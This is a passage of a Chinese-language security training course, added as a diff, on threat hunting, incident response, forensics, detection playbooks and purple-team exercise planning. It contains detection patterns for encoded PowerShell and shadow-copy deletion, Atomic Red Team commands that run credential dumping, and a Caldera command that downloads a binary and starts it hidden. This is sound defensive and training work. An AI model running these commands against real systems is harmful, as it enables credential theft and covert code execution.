+                "bool": {
+                    "must": [
+                        {"match": {"winlog.event_id": "4104"}},
+                        {"query_string": {
+                            "query": "ScriptBlockText:(*-enc* OR *FromBase64String* OR *IEX*)"
+                        }}
+                    ]
+                }
+            },
+            "size": 1000
+        }
+
+        results = self.es.search(index="security-logs-*", body=query)
+        return self.analyze_results(results)
+
+    def hunt_lateral_movement(self):
+        """
+        狩猎横向移动
+        """
+        query = {
+            "query": {
+                "bool": {
+                    "must": [
+                        {"match": {"winlog.event_id": "4624"}},
+                        {"match": {"winlog.event_data.LogonType": "3"}}
+                    ]
+                }
+            },
+            "aggs": {
+                "by_user": {
+                    "terms": {"field": "winlog.event_data.TargetUserName"},
+                    "aggs": {
+                        "unique_sources": {
+                            "cardinality": {"field": "winlog.event_data.IpAddress"}
+                        }
+                    }
+                }
+            }
+        }
+
+        results = self.es.search(index="security-logs-*", body=query)
+
+        # 分析：同一用户从多个IP登录可能是横向移动
+        suspicious_users = []
+        for bucket in results['aggregations']['by_user']['buckets']:
+            if bucket['unique_sources']['value'] &gt; 10:
+                suspicious_users.append({
+                    'user': bucket['key'],
+                    'unique_ips': bucket['unique_sources']['value']
+                })
+
+        return suspicious_users
+
+    def hunt_persistence(self):
+        """
+        狩猎持久化机制
+        """
+        persistence_indicators = [
+            # 注册表Run键
+            {"match": {"winlog.event_id": "4657"}},  # 注册表修改
+            {"query_string": {"query": "ObjectName:(*\\Run OR *\\RunOnce)"}},
+
+            # 计划任务
+            {"match": {"winlog.event_id": "4698"}},  # 计划任务创建
+
+            # 服务创建
+            {"match": {"winlog.event_id": "7045"}},  # 服务安装
+
+            # WMI事件订阅
+            {"query_string": {"query": "EventConsumer OR EventFilter"}}
+        ]
+
+        results = []
+        for indicator in persistence_indicators:
+            query = {"query": {"bool": {"must": [indicator]}}}
+            result = self.es.search(index="security-logs-*", body=query)
+            results.append(result)
+
+        return results
+
+    def generate_hunt_report(self):
+        """
+        生成狩猎报告
+        """
+        report = {
+            'timestamp': datetime.now(),
+            'findings': {
+                'powershell_obfuscation': self.hunt_powershell_obfuscation(),
+                'lateral_movement': self.hunt_lateral_movement(),
+                'persistence': self.hunt_persistence()
+            }
+        }
+
+        # 生成HTML报告
+        html_report = f"""
+        &lt;html&gt;
+        &lt;head&gt;&lt;title&gt;威胁狩猎报告&lt;/title&gt;&lt;/head&gt;
+        &lt;body&gt;
+            &lt;h1&gt;威胁狩猎报告&lt;/h1&gt;
+            &lt;p&gt;生成时间: {report['timestamp']}&lt;/p&gt;
+
+            &lt;h2&gt;PowerShell混淆检测&lt;/h2&gt;
+            &lt;table&gt;
+                &lt;tr&gt;&lt;th&gt;主机&lt;/th&gt;&lt;th&gt;用户&lt;/th&gt;&lt;th&gt;命令&lt;/th&gt;&lt;/tr&gt;
+                {self._generate_table_rows(report['findings']['powershell_obfuscation'])}
+            &lt;/table&gt;
+
+            &lt;h2&gt;横向移动检测&lt;/h2&gt;
+            &lt;table&gt;
+                &lt;tr&gt;&lt;th&gt;用户&lt;/th&gt;&lt;th&gt;唯一IP数量&lt;/th&gt;&lt;/tr&gt;
+                {self._generate_table_rows(report['findings']['lateral_movement'])}
+            &lt;/table&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+        """
+
+        return html_report
+</code></pre>
+<h3 id="33-应急响应"><a class="header" href="#33-应急响应">3.3 应急响应</a></h3>
+<h4 id="事件响应流程"><a class="header" href="#事件响应流程">事件响应流程</a></h4>
+<p><strong>NIST SP 800-61响应框架</strong>:</p>
+<pre><code>1. 准备 (Preparation)
+   ├── 建立响应团队
+   ├── 制定响应计划
+   ├── 配置监控工具
+   └── 准备取证工具
+
+2. 检测与分析 (Detection &amp; Analysis)
+   ├── 告警接收
+   ├── 初步分类
+   ├── 深度分析
+   └── 范围确定
+
+3. 遏制、根除与恢复 (Containment, Eradication &amp; Recovery)
+   ├── 短期遏制（隔离受感染系统）
+   ├── 长期遏制（打补丁、加固）
+   ├── 根除威胁
+   └── 系统恢复
+
+4. 事后活动 (Post-Incident Activity)
+   ├── 经验教训总结
+   ├── 证据保留
+   ├── 流程改进
+   └── 培训更新
+</code></pre>
+<p><strong>应急响应Playbook</strong>:</p>
+<pre><code class="language-yaml"># Ransomware响应Playbook
+name: "勒索软件应急响应"
+severity: critical
+triggers:
+  - 检测到文件批量加密
+  - 发现勒索信
+  - 异常加密进程
+
+步骤:
+  1_初始响应:
+    - 时限: 15分钟
+    - 操作:
+      - 隔离受感染主机（断网但不关机）
+      - 通知安全团队和管理层
+      - 记录初始时间线
+    - 负责人: SOC值班人员
+
+  2_遏制:
+    - 时限: 1小时
+    - 操作:
+      - 识别感染范围
+      - 隔离所有受影响系统
+      - 禁用可疑账户
+      - 阻断C2通信（防火墙规则）
+    - 负责人: 安全工程师
+
+  3_调查:
+    - 时限: 4小时
+    - 操作:
+      - 内存取证（捕获RAM）
+      - 磁盘镜像
+      - 网络流量分析
+      - 日志分析（查找初始入侵点）
+      - 恶意软件样本提取
+    - 负责人: 取证分析师
+
+  4_根除:
+    - 时限: 24小时
+    - 操作:
+      - 删除恶意软件
+      - 重置被盗凭证
+      - 修补漏洞
+      - 清理持久化机制
+    - 负责人: 系统管理员
+
+  5_恢复:
+    - 时限: 72小时
+    - 操作:
+      - 从备份恢复数据
+      - 重建受感染系统
+      - 验证系统完整性
+      - 逐步恢复业务
+    - 负责人: IT运维团队
+
+  6_复盘:
+    - 时限: 1周后
+    - 操作:
+      - 编写事件报告
+      - 分析根本原因
+      - 更新防御策略
+      - 团队培训
+    - 负责人: CISO
+</code></pre>
+<h4 id="数字取证"><a class="header" href="#数字取证">数字取证</a></h4>
+<p><strong>内存取证</strong>:</p>
+<pre><code class="language-bash"># Volatility内存分析框架
+
+# 1. 获取内存镜像
+# Windows
+FTK Imager (GUI工具)
+winpmem_mini_x64.exe memdump.raw
+
+# Linux
+sudo dd if=/dev/mem of=/tmp/memory.dump
+# 或使用LiME
+sudo insmod lime.ko "path=/tmp/memory.lime format=lime"
+
+# 2. 确定内存配置文件
+volatility -f memdump.raw imageinfo
+
+# 3. 进程分析
+# 列出进程
+volatility -f memdump.raw --profile=Win10x64_19041 pslist
+volatility -f memdump.raw --profile=Win10x64_19041 pstree
+
+# 检测隐藏进程
+volatility -f memdump.raw --profile=Win10x64_19041 psxview
+
+# 4. 网络连接分析
+volatility -f memdump.raw --profile=Win10x64_19041 netscan
+volatility -f memdump.raw --profile=Win10x64_19041 connscan
+
+# 5. 恶意代码检测
+# 检测注入
+volatility -f memdump.raw --profile=Win10x64_19041 malfind
+volatility -f memdump.raw --profile=Win10x64_19041 hollowfind
+
+# 提取可疑进程
+volatility -f memdump.raw --profile=Win10x64_19041 procdump -p 1234 -D output/
+
+# 6. 注册表分析
+volatility -f memdump.raw --profile=Win10x64_19041 hivelist
+volatility -f memdump.raw --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
+
+# 7. 时间线分析
+volatility -f memdump.raw --profile=Win10x64_19041 timeliner --output=body &gt; timeline.body
+mactime -b timeline.body -d &gt; timeline.csv
+
+# 8. 命令历史
+volatility -f memdump.raw --profile=Win10x64_19041 cmdscan
+volatility -f memdump.raw --profile=Win10x64_19041 consoles
+</code></pre>
+<p><strong>磁盘取证</strong>:</p>
+<pre><code class="language-bash"># Autopsy取证框架
+
+# 1. 磁盘镜像获取
+# 使用FTK Imager或dd
+sudo dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress
+
+# 计算哈希值（证据完整性）
+md5sum disk.img &gt; disk.img.md5
+sha256sum disk.img &gt; disk.img.sha256
+
+# 2. 挂载镜像（只读）
+sudo mount -o ro,loop disk.img /mnt/forensics
+
+# 3. 文件系统分析
+# 使用Sleuth Kit
+fls -r disk.img
+
+# 查找已删除文件
+fls -rd disk.img
+
+# 恢复已删除文件
+icat disk.img [inode] &gt; recovered_file
+
+# 4. 时间线分析
+fls -m / -r disk.img &gt; bodyfile
+mactime -b bodyfile -d &gt; timeline.csv
+
+# 5. 文件签名分析
+# 检测文件类型伪装
+file * | grep -v "ASCII text"
+
+# 6. 关键词搜索
+grep -r "password" /mnt/forensics/
+grep -r "confidential" /mnt/forensics/
+
+# 7. 浏览器取证
+# Chrome历史
+sqlite3 /mnt/forensics/Users/*/AppData/Local/Google/Chrome/User\ Data/Default/History \
+  "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;"
+
+# Firefox历史
+sqlite3 /mnt/forensics/Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite \
+  "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;"
+</code></pre>
+<h3 id="34-蓝队检测剧本库detection-playbooks"><a class="header" href="#34-蓝队检测剧本库detection-playbooks">3.4 蓝队检测剧本库（Detection Playbooks）</a></h3>
+<h4 id="劇本-bt-001powershell-恶意执行检测"><a class="header" href="#劇本-bt-001powershell-恶意执行检测">劇本 #BT-001：PowerShell 恶意执行检测</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>步骤</th><th>操作</th><th>说明</th></tr></thead><tbody>
+<tr><td>数据源确认</td><td>启用PowerShell ScriptBlock日志(4104)、模块日志(4103)、Sysmon(1,7)</td><td>需下发组策略并验证成功</td></tr>
+<tr><td>基线学习</td><td>统计<code>CommandLine</code>常见模式、系统账号</td><td>使用KQL/Splunk baseline分析</td></tr>
+<tr><td>规则编写</td><td>Sigma：<code>title: suspicious powershell encoded command</code></td><td>包含<code>-enc</code>、<code>FromBase64String</code>、<code>downloadstring</code>等关键字</td></tr>
+<tr><td>SOAR剧本</td><td>触发后自动收集<code>Get-Process</code>, <code>Get-Service</code>, <code>Get-WinEvent</code></td><td>结合EDR API执行隔离</td></tr>
+<tr><td>复测</td><td>使用Invoke-Obfuscation生成样本命令</td><td>与红队协同进行验证</td></tr>
+</tbody></table>
+</div>
+<p><strong>Splunk检测查询</strong>：</p>
+<pre><code>index=security winlog.channel=Microsoft-Windows-PowerShell/Operational EventCode=4104
+| stats values(ScriptBlockText) as script, min(_time) as first_seen by Computer, UserID
+| search script="*FromBase64String*" OR script="*IEX*"
+</code></pre>
+<p><strong>KQL检测查询（Defender for Endpoint）</strong>：</p>
+<pre><code>DeviceEvents
+| where ActionType == "PowerShellCommand" and Timestamp &gt; ago(1d)
+| extend CommandLine = tostring(AdditionalFields["CommandLine"])
+| where CommandLine has_any ("-enc", "FromBase64String", "DownloadString")
+| summarize count(), make_set(CommandLine) by DeviceName, InitiatingProcessAccountName
+</code></pre>
+<h4 id="劇本-bt-002横向移动-pass-the-hash"><a class="header" href="#劇本-bt-002横向移动-pass-the-hash">劇本 #BT-002：横向移动 (Pass-the-Hash)</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>步骤</th><th>操作</th><th>说明</th></tr></thead><tbody>
+<tr><td>数据源</td><td>Windows安全日志(4624/4625/4648)、Sysmon 10、EDR认证日志</td><td>需保留完整登录事件</td></tr>
+<tr><td>规则设计</td><td>识别短时间内同一账户从不同IP登录、NTLM认证</td><td>建立白名单（运维跳板）</td></tr>
+<tr><td>查询示例</td><td><code>4624 LogonType=3</code> + 同一<code>TargetUserName</code>多源IP</td><td>结合Zeek SMB日志佐证</td></tr>
+<tr><td>响应动作</td><td>建议自动触发：冻结账号、记录哈希、通知值班</td><td>需与账号管理流程联动</td></tr>
+</tbody></table>
+</div>
+<pre><code>index=security sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
+| stats dc(Source_Network_Address) as src_cnt, values(Source_Network_Address) as srcs by Target_User_Name, _time span=15m
+| where src_cnt &gt;= 3
+</code></pre>
+<h4 id="劇本-bt-003数据渗出检测"><a class="header" href="#劇本-bt-003数据渗出检测">劇本 #BT-003：数据渗出检测</a></h4>
+<p>| 数据源 | Proxy/Firewall日志、Zeek、DNS日志 |
+| 指标 | 出口流量大小、会话持续时间、域名熵值 |
+| 查询 | <code>where bytes_out &gt; 10000000 and dest_port in (443,8080) and not dest_domain in whitelist</code> |
+| 响应 | 自动阻断、通知网络团队、触发取证采集 |</p>
+<p><strong>Zeek脚本片段</strong>：</p>
+<pre><code class="language-zeek">redef Notice::policy += {
+    [$pred(n: Notice::Info) =
+        n$note == Notice::HTTP::Large-Upload,
+        $actions = Notice::ACTION_EMAIL]
+};
+</code></pre>
+<h4 id="劇本-bt-004勒索软件初期检测"><a class="header" href="#劇本-bt-004勒索软件初期检测">劇本 #BT-004：勒索软件初期检测</a></h4>
+<ul>
+<li><strong>行为特征</strong>：短时间内大量文件被修改、创建可疑进程、出现加密后缀。</li>
+<li><strong>检测手段</strong>：
+<ul>
+<li>文件审计：使用FSRM或EDR监控<code>*.locked</code>、<code>*.encrypted</code>等后缀。</li>
+<li>进程行为：查<code>vssadmin delete shadows</code>、<code>wmic shadowcopy delete</code>。</li>
+<li>网络行为：随机子域、Tor出口、比特币地址。</li>
+</ul>
+</li>
+<li><strong>KQL示例</strong>：</li>
+</ul>
+<pre><code>DeviceFileEvents
+| where Timestamp &gt; ago(1h)
+| where ActionType == "FileRenamed" and FileName endswith ".locked"
+| summarize count() by DeviceName, InitiatingProcessFileName
+| where count_ &gt; 500
+</code></pre>
+<ul>
+<li><strong>响应动作</strong>：
+<ol>
+<li>自动隔离终端；</li>
+<li>阻断可疑C2域名/IP；</li>
+<li>触发取证采集（内存、磁盘、日志）；</li>
+<li>通过SOAR创建工单并通知业务。</li>
+</ol>
+</li>
+</ul>
+<h3 id="35-威胁狩猎案例研究"><a class="header" href="#35-威胁狩猎案例研究">3.5 威胁狩猎案例研究</a></h3>
+<h4 id="案例一隐蔽的cobalt-strike-beacon"><a class="header" href="#案例一隐蔽的cobalt-strike-beacon">案例一：隐蔽的Cobalt Strike Beacon</a></h4>
+<ol>
+<li><strong>假设</strong>：攻击者使用HTTP beacon，间隔为60s，User-Agent伪装。</li>
+<li><strong>数据准备</strong>：抓取代理日志、Zeek http.log。</li>
+<li><strong>分析步骤</strong>：
+<ul>
+<li>计算每个源IP的请求间隔方差；</li>
+<li>筛选Path长度固定、状态码200/204的请求；</li>
+<li>使用熵算法识别Cookie/URI异常。</li>
+</ul>
+</li>
+<li><strong>脚本示例（Python）</strong>：</li>
+</ol>
+<pre><code class="language-python">import pandas as pd
+
+def detect_beacon(log_file):
+    df = pd.read_csv(log_file)
+    df['timestamp'] = pd.to_datetime(df['timestamp'])
+    result = []
+    for (src, dest), group in df.groupby(['src_ip', 'dest_ip']):
+        group = group.sort_values('timestamp')
+        interval = group['timestamp'].diff().dt.total_seconds().dropna()
+        if len(interval) &gt;= 5 and interval.std() &lt; 5:
+            result.append({'src': src, 'dest': dest, 'mean_interval': interval.mean()})
+    return pd.DataFrame(result)
+</code></pre>
+<ol start="5">
+<li><strong>输出</strong>：可疑IP列表、请求特征、日志样本，提交给SOC进一步分析。</li>
+</ol>
+<h4 id="案例二可疑横向rdp链路"><a class="header" href="#案例二可疑横向rdp链路">案例二：可疑横向RDP链路</a></h4>
+<ul>
+<li>使用Elastic查询（EQL）寻找1小时内同一账户从多个主机发起RDP：</li>
+</ul>
+<pre><code>sequence by TargetUserName with maxspan=1h
+  [ authentication where LogonType == "10" ]
+  [ authentication where LogonType == "10" ]
+</code></pre>
+<ul>
+<li>分析登录源、目标、地理位置，匹配工作时间表。</li>
+<li>输出结果进入SOAR，若异常则执行锁定账户。</li>
+</ul>
+<hr />
+<h2 id="模块四紫队协同与攻防融合"><a class="header" href="#模块四紫队协同与攻防融合">模块四：紫队协同与攻防融合</a></h2>
+<h3 id="模块总览协同视角"><a class="header" href="#模块总览协同视角">模块总览（协同视角）</a></h3>
+<ul>
+<li><strong>定位</strong>：让红蓝双方在可控节奏下共享知识、验证检测、快速关闭防御缺口，实现“攻防双向奔赴”。</li>
+<li><strong>关键成果</strong>：
+<ul>
+<li>Purple Team Playbook（步骤、输入、输出、度量）</li>
+<li>攻防联动看板（演练进度、检测结果、行动项）</li>
+<li>检测验证记录（Detection Validation Record）与改进项追踪</li>
+</ul>
+</li>
+<li><strong>协作循环</strong>：Plan → Execute → Detect → Measure → Improve。</li>
+</ul>
+<h4 id="紫队作战画布purple-team-canvas"><a class="header" href="#紫队作战画布purple-team-canvas">紫队作战画布（Purple Team Canvas）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>区域</th><th>核心内容</th><th>负责人</th></tr></thead><tbody>
+<tr><td>演练目标</td><td>业务场景、关键资产、成功准则</td><td>白队/业务负责人</td></tr>
+<tr><td>攻击假设</td><td>对应的MITRE战术、攻击路径、工具</td><td>红队</td></tr>
+<tr><td>检测假设</td><td>预期触发规则、数据源、日志字段</td><td>蓝队</td></tr>
+<tr><td>验证方式</td><td>原子化测试、Caldera任务、脚本</td><td>紫队</td></tr>
+<tr><td>成功标准</td><td>检测时间、告警级别、响应动作</td><td>蓝队/白队</td></tr>
+<tr><td>改进计划</td><td>工具更新、流程优化、培训需求</td><td>紫队统筹</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>紫队是“翻译官”与“教练”，核心在于把一次次攻防对抗转化为可测量、可追踪的改进迭代。</p>
+</blockquote>
+<h3 id="41-紫队概念"><a class="header" href="#41-紫队概念">4.1 紫队概念</a></h3>
+<p><strong>紫队作用</strong>:</p>
+<pre><code>1. 知识共享
+   - 红队分享攻击技术
+   - 蓝队分享检测方法
+   - 共同提升能力
+
+2. 协同演练
+   - 受控环境下攻防
+   - 实时反馈优化
+   - 快速迭代改进
+
+3. 工具开发
+   - 攻击模拟工具
+   - 检测规则优化
+   - 自动化响应
+
+4. 持续改进
+   - 定期评估防御
+   - 更新检测规则
+   - 完善响应流程
+</code></pre>
+<h3 id="42-协同演练"><a class="header" href="#42-协同演练">4.2 协同演练</a></h3>
+<p><strong>Atomic Red Team</strong>:</p>
+<pre><code class="language-powershell"># Atomic Red Team - 原子化攻击测试
+
+# 安装
+Install-Module -Name invoke-atomicredteam -Scope CurrentUser
+Import-Module invoke-atomicredteam
+
+# 列出所有测试
+Invoke-AtomicTest All -ShowDetailsBrief
+
+# 执行特定测试（T1003 - Credential Dumping）
+Invoke-AtomicTest T1003
+
+# 仅显示测试详情，不执行
+Invoke-AtomicTest T1003 -ShowDetails
+
+# 清理测试痕迹
+Invoke-AtomicTest T1003 -Cleanup
+
+# 自定义测试
+Invoke-AtomicTest T1003.001 -InputArgs @{
+    "output_file" = "C:\temp\credentials.txt"
+}
+
+# 批量执行测试
+$tests = @("T1003", "T1059", "T1055")
+foreach ($test in $tests) {
+    Write-Host "[*] 执行测试: $test"
+    Invoke-AtomicTest $test
+
+    # 等待蓝队检测
+    Start-Sleep -Seconds 60
+
+    # 清理
+    Invoke-AtomicTest $test -Cleanup
+}
+</code></pre>
+<p><strong>Caldera自动化对抗平台</strong>:</p>
+<pre><code class="language-yaml"># Caldera操作配置
+
+# 1. 安装Caldera
+git clone https://github.com/mitre/caldera.git
+cd caldera
+pip3 install -r requirements.txt
+python3 server.py --insecure
+
+# 2. 访问界面
+http://localhost:8888
+
+# 3. 部署Agent
+# Windows
+server="http://caldera-server:8888"
+agent="sandcat"
+$url="$server/file/download"
+$wc=New-Object System.Net.WebClient
+$wc.Headers.add("platform","windows")
+$wc.Headers.add("file","sandcat.go")
+$data=$wc.DownloadData($url)
+$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9)
+[io.file]::WriteAllBytes("$env:TEMP\$name",$data)
+Start-Process -FilePath $env:TEMP\$name -ArgumentList "-server $server -group red" -WindowStyle hidden
+
+# 4. 创建对抗行动
+operation:
+  name: "APT模拟"
+  group: "red"
+  planner: "atomic"
+  adversary: "APT29"
+
+  facts:
+    - trait: "host.user.name"
+      value: "administrator"
+    - trait: "domain.controller"
+      value: "dc.internal.com"
+
+  steps:
+    - technique: "T1078"  # Valid Accounts
+      executor: "psh"
+
+    - technique: "T1003"  # Credential Dumping
+      executor: "psh"
+
+    - technique: "T1021"  # Remote Services
+      executor: "psh"
+
+# 5. 监控执行
+# Caldera提供实时执行监控和结果收集
+</code></pre>
+<h3 id="紫队联动节奏建议"><a class="header" href="#紫队联动节奏建议">紫队联动节奏建议</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>周期</th><th>步骤</th><th>主要任务</th><th>产出</th></tr></thead><tbody>
+<tr><td>Day 0 (Kick-off)</td><td>目标对齐</td><td>明确业务场景、攻防主题、数据源接入</td><td>攻防目标清单、数据准备计划</td></tr>
+<tr><td>Day 1-2</td><td>攻击脚本准备</td><td>红队编写Atomic/Caldera脚本，白队确认安全阈值</td><td>攻击脚本、回滚方案</td></tr>
+<tr><td>Day 3</td><td>攻击执行</td><td>红队执行场景攻击，蓝队实时观察并记录日志</td><td>攻击日志、检测记录</td></tr>
+<tr><td>Day 4</td><td>检测验证</td><td>蓝队调试规则、SOAR流程，验证告警与自动化响应</td><td>检测验证报告、误报清单</td></tr>
+<tr><td>Day 5</td><td>改进迭代</td><td>紫队主持复盘，形成行动项并分配责任人</td><td>改进计划、指标更新</td></tr>
+</tbody></table>
+</div>
+<h3 id="检测验证记录模板detection-validation-record"><a class="header" href="#检测验证记录模板detection-validation-record">检测验证记录模板（Detection Validation Record）</a></h3>
+<pre><code class="language-markdown">- 场景编号：PT-2024-001
+- MITRE映射：T1059.001 PowerShell、T1047 WMI
+- 攻击描述：使用PowerShell下载执行payload，随后通过WMI横向移动
+- 期望检测：
+  - 规则A（EDR-PS-Encoded）：命中，严重级
+  - 规则B（SIEM-WMI-Exec）：未命中
+- 实际结果：
+  - A成功触发，响应耗时12分钟
+  - B未触发，原因：缺少4292事件日志
+- 改进措施：
+  - 开启目标主机WMI日志
+  - 新增Sigma规则`wmi_remote_process_creation`
+  - 将检测纳入SOAR Playbook
+- 复测计划：改动完成后48小时内复测
+</code></pre>
+<h3 id="攻防联动指标purple-kpi"><a class="header" href="#攻防联动指标purple-kpi">攻防联动指标（Purple KPI）</a></h3>
+<ul>
+<li>攻防验证完成率 = 完成验证场景数 / 计划场景总数 ≥ 90%</li>
+<li>检测达标率 = 成功触发检测的场景数 / 总场景数 ≥ 75%</li>
+<li>缩短周期 = 从场景提出到检测上线平均时间 ≤ 10天</li>
+<li>行动项关闭率 = 30天内关闭改进项 / 改进项总数 ≥ 85%</li>
+</ul>
+<hr />
+<h2 id="模块五对抗演练设计与落地"><a class="header" href="#模块五对抗演练设计与落地">模块五：对抗演练设计与落地</a></h2>
+<h3 id="模块总览演练视角"><a class="header" href="#模块总览演练视角">模块总览（演练视角）</a></h3>
+<ul>
+<li><strong>目标</strong>：从战略到执行全面设计红蓝对抗演练计划，确保“可控、可测、可复现”，并将业务影响控制在可接受范围内。</li>
+<li><strong>核心交付物</strong>：
+<ul>
+<li>演练计划书（目标、范围、时间、资源、风险控制）</li>
+<li>沟通与汇报机制（日报、周报、告警升级流程）</li>
+<li>证据与指标库（日志、截图、时间线、评分表）</li>
+<li>演练报告、改进计划、指标跟踪表</li>
+</ul>
+</li>
+<li><strong>关键流程</strong>：Define → Prepare → Execute → Evaluate → Improve。</li>
+</ul>
+<h4 id="演练筹备九步法"><a class="header" href="#演练筹备九步法">演练筹备九步法</a></h4>
+<ol>
+<li>明确业务目标与指标（如攻击面缩减、检测时延&lt;15分钟）。</li>
+<li>梳理关键资产、数据分级与供应链依赖，建立优先级矩阵。</li>
+<li>完成风险评估与影响矩阵，设定中止条件与回滚方案。</li>
+<li>设计攻击/防御场景与对应成功判定标准。</li>
+<li>准备演练环境（靶场、VPN、日志管道、快照/备份、演练工单系统）。</li>
+<li>建立通信渠道、值班表、证据命名规范及文档模板。</li>
+<li>进行桌面演练（Tabletop）或红蓝影子演练预演。</li>
+<li>正式运行演练并使用Runbook记录每个行动、时间、影响。</li>
+<li>演练结束后开展复盘、行动项跟踪、经验沉淀与培训。</li>
+</ol>
+<h3 id="51-演练规划"><a class="header" href="#51-演练规划">5.1 演练规划</a></h3>
+<h4 id="演练范围定义"><a class="header" href="#演练范围定义">演练范围定义</a></h4>
+<p><strong>范围矩阵</strong>:</p>
+<pre><code>资产类型        | 是否包含 | 限制条件
+---------------|---------|------------------
+外网Web服务器   | ✓       | 禁止DDoS攻击
+内网办公PC      | ✓       | 办公时间外测试
+域控制器        | ✓       | 只读操作，禁止修改
+数据库服务器    | ✓       | 禁止删除数据
+生产环境        | ✗       | 完全排除
+第三方系统      | ✗       | 未获授权
+</code></pre>
+<p><strong>时间安排</strong>:</p>
+<pre><code>阶段          | 时间       | 主要活动
+-------------|-----------|------------------
+准备阶段      | 2周       | 环境准备、规则制定
+红队侦察      | 3天       | 被动信息收集
+红队攻击      | 7天       | 主动渗透测试
+蓝队监控      | 持续      | 7x24小时监控
+每日复盘      | 每晚1小时  | 总结当日攻防
+最终复盘      | 2天       | 全面总结报告
+</code></pre>
+<h3 id="演练控制塔control-tower配置"><a class="header" href="#演练控制塔control-tower配置">演练控制塔（Control Tower）配置</a></h3>
+<ul>
+<li><strong>任务看板</strong>：使用Jira/Trello设置泳道（红队、蓝队、白队、风险），记录任务状态、阻塞项与责任人。</li>
+<li><strong>实时沟通</strong>：建立专用IM群组（钉钉/Slack/Teams），配置机器人推送关键告警、行动项，所有语音需在30分钟内形成纪要。</li>
+<li><strong>证据存储</strong>：使用加密文件库（Nextcloud/SharePoint），按照<code>YYYYMMDD-团队-编号</code>命名，白队负责权限审计与版本管理。</li>
+<li><strong>指标面板</strong>：在Grafana/PowerBI展示关键指标（检测耗时、响应耗时、成功率、风险评分），每晚快照归档。</li>
+<li><strong>风险台账</strong>：白队维护<code>Risk Register</code>，包含风险描述、影响度、可能性、缓解措施、负责人、状态。</li>
+</ul>
+<h3 id="沟通升级流程communication-escalation"><a class="header" href="#沟通升级流程communication-escalation">沟通升级流程（Communication Escalation）</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>等级</th><th>触发条件</th><th>通知对象</th><th>响应时限</th><th>备注</th></tr></thead><tbody>
+<tr><td>L0 日常</td><td>常规行动、低风险告警</td><td>红/蓝队操作员</td><td>即时记录</td><td>日报汇总</td></tr>
+<tr><td>L1 警示</td><td>触发高危资产、可能影响敏感数据</td><td>红/蓝队负责人、白队</td><td>10分钟内</td><td>启动影响评估</td></tr>
+<tr><td>L2 重大</td><td>业务中断风险、误操作影响生产</td><td>CISO、IT负责人、业务负责人</td><td>5分钟内</td><td>评估是否暂停演练</td></tr>
+<tr><td>L3 危机</td><td>实际造成重大影响或舆情风险</td><td>高管、法务、PR</td><td>立即</td><td>进入应急响应流程</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>所有升级需记录在演练日志中，包含时间、触发原因、措施、结果；演练结束后纳入复盘材料。</p>
+</blockquote>
+<h3 id="52-指标体系与评分模型"><a class="header" href="#52-指标体系与评分模型">5.2 指标体系与评分模型</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>指标</th><th>评分标准</th><th>说明</th></tr></thead><tbody>
+<tr><td>红队成功率</td><td>攻击路径完成度</td><td>成功完成完整链路得20分；部分完成10分；失败0分</td><td>根据攻击链条数量累计</td></tr>
+<tr><td>红队隐蔽性</td><td>被检测时延</td><td>未被发现得20分；被发现但&gt;2小时10分；&lt;2小时5分</td><td>需记录检测时间</td></tr>
+<tr><td>蓝队检测率</td><td>告警命中</td><td>关键阶段告警20分；部分命中10分；未命中0分</td><td>结合应急工单</td></tr>
+<tr><td>蓝队响应</td><td>响应时效</td><td>&lt;30分钟20分；30-60分钟10分；&gt;60分钟5分</td><td>以SOAR/工单时间为准</td></tr>
+<tr><td>协同改进</td><td>行动项交付</td><td>30天内完成&gt;90%行动项20分；70%-90% 10分；&lt;70% 5分</td><td>白队跟踪</td></tr>
+</tbody></table>
+</div>
+<p><strong>数据收集方法</strong>：</p>
+<ul>
+<li>使用演练控制塔看板自动统计分数，支持导出CSV。</li>
+<li>每天例会更新得分，防止遗漏。</li>
+<li>分析高分/低分原因，形成经验库。</li>
+</ul>
+<h3 id="53-演练文档与时间线示例"><a class="header" href="#53-演练文档与时间线示例">5.3 演练文档与时间线示例</a></h3>
+<pre><code>2024-05-06 (Day 0)
+09:00 Kick-off会议，确认授权书与中止条件
+13:30 红队开始被动侦察
+16:00 蓝队完成日志健康检查
+
+2024-05-07 (Day 1)
+10:20 红队成功钓鱼，获取VPN凭证
+10:35 白队记录事件编号 RT-2024-001
+10:50 蓝队尚未发现
+14:10 蓝队SIEM告警，触发响应流程，开始隔离账号
+16:30 紫队会议，确认需新增检测规则
+
+2024-05-08 (Day 2)
+09:15 红队横向到数据库服务器
+09:20 蓝队EDR捕获异常，可疑命令`sqlcmd`
+09:30 蓝队阻断会话并收集证据
+11:00 白队更新风险台账，等级L1
+17:00 日报输出，列出3个行动项
+</code></pre>
+<h3 id="54-风险矩阵示例"><a class="header" href="#54-风险矩阵示例">5.4 风险矩阵示例</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>风险ID</th><th>描述</th><th>可能性 (1-5)</th><th>影响 (1-5)</th><th>风险等级</th><th>缓解措施</th><th>负责人</th></tr></thead><tbody>
+<tr><td>R-01</td><td>演练导致生产数据被修改</td><td>2</td><td>5</td><td>10 (高)</td><td>仅在仿真环境执行、白队实时监控</td><td>白队负责人</td></tr>
+<tr><td>R-02</td><td>钓鱼邮件被外部人员收到</td><td>3</td><td>4</td><td>12 (高)</td><td>使用白名单邮箱、单批次&lt;50封</td><td>红队负责人</td></tr>
+<tr><td>R-03</td><td>演练日志丢失</td><td>2</td><td>4</td><td>8 (中)</td><td>使用集中日志与备份</td><td>蓝队日志管理员</td></tr>
